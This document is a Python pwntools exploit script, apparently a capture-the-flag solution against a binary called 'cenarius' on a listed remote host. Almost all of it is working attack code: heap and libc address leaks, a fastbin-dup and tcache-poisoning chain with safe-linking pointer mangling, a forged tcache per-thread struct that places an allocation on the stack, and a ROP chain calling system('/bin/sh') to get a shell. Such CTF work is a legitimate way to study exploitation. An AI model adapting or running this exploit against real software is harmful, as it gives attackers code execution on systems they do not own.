from pwn import *
context.arch = 'amd64'
#context.log_level = 'debug'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './cenarius'
HOST = '141.164.48.191'
PORT = 10002

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()

prompt = b'$ '
def do_set(name, content):
    if type(name) == bytes:
        r.sendlineafter(prompt, b'set ' + name + b'=' + content)
    else:
        r.sendlineafter(prompt, 'set {}={}'.format(name, content).encode())
def unset(name):
    if type(name) == bytes:
        r.sendlineafter(prompt, b'unset '+(name))
    else:
        r.sendlineafter(prompt, 'unset {}'.format(name).encode())
def echo(name):
    r.sendlineafter(prompt, 'echo {}'.format(name).encode())


# leak heap from key
do_set('4', 'a'*0x1)
do_set('5', 'a'*0x1)
unset('4')

do_set('7', '')
echo('7')
r.recvuntil(b'7: ')
leak = u64(r.recvuntil(b'\n', True).ljust(8, b'\x00'))
dbg('leak')
heap = leak << 12
dbg('heap')

# leak libc
do_set('1', 'a'*0x418)
do_set('2', 'b'*0x1)
unset('1')
do_set('3', '\x01')
echo('3')
r.recvuntil(b'3: ')
leak = u64(r.recvuntil(b'\n', True).ljust(8, b'\x00'))
dbg('leak')
base = leak -0x219001
dbg('base')
got_strcmp = base + 0x218190
system = base + 0x54ae0
environ = base + 0x220ec0
binsh  = 0x1dbcba + base
rdi = base + 0x2e6c5

# create overlap
for i in range(10):
    do_set(chr(0x41+i), 'a')

do_set('x', '\x01')

# abcdefg hij
for i in range(7):
    unset(chr(0x41+i))

# fastbin dup ( caution: edge of fastbin value = edge of tcache value = key, so that we cant seek edge fastbin. create additional chunk to avoid this.)
unset('H')
unset('I')
unset('J')

def mangle(addr):
    return (heap>>12) ^ (addr)

unset(p64(mangle(heap + 0x5b0)).strip(b'\x00'))

# stashing dup to tcache
for i in range(7):
    do_set(chr(0x30+i).encode(), flat(0xf1, 0xf1, 0xf1))

# content -> next struct, fd -> next content
do_set(p64(mangle(heap + 0x660)).strip(b'\x00'), p64(mangle(heap + 0x670)).strip(b'\x00'))
do_set('w', 'W')
do_set('ww', 'WW')

# next content -> heap + 0x5b0 ( 0xf0 sized chunk), next fd -> controled area
do_set(b'www', flat(heap+0x5b0, heap + 0x5c0).strip(b'\x00'))
if args.D:
	debug(r, [0x14cf])
unset('www')

# next content -> environ to leak stack. while we have to repair our aaw struct 'www' due to my poor layout. :/
do_set(b'www', flat(1, 2, 3, 4, 5, 6, 7, 8, 9, 0xaa, 0xb, 0x31, 0x41, 0, environ, heap+0x660, 0, 0x21, 0, 0, 0, 0x31, 0x777777, 0, heap + 0x5b0, 0).ljust(0xe8, b'\x00'))
echo('A')
r.recvuntil(b'A: ')
leak = u64(r.recvuntil(b'\n', True).ljust(8, b'\x00'))
dbg('leak')
target = leak - 0x670-8 # malloc align
dbg('target')
unset('www')

# next content -> per-thread struct to arb alloc
do_set(b'www', flat(1, 2, 3, 4, 5, 6, 7, 8, 9, 0xaa, 0xb, 0x31, 0x41, 0, heap + 0x10, 0, 0, 0x21, 0, 0, 0, 0x31, 0x777777, 0, heap + 0x5b0, 0).ljust(0xe8, b'\x00'))

# for next allocation, we need some pads.
do_set('dummy1', 'dum')
do_set('dummy2', 'dum')
unset('dummy1')
unset('A')

# fake per-thread struct (next 0x50 sized chunk will alloc stack)
payload = b''
payload += p16(0)*3 + p16(1)
payload = payload.ljust(0x80, b'\x00')
payload += flat(0, 0, 0, target)
payload = payload.ljust(0x288, b'\x00')
do_set(b'www', payload)

# send rop & trigger
payload = b''
payload += flat(0xdead, rdi+1, rdi, binsh, system)
payload = payload.ljust(0x48, b'\x00')
do_set(b'ropper', payload)

r.interactive()
r.close()
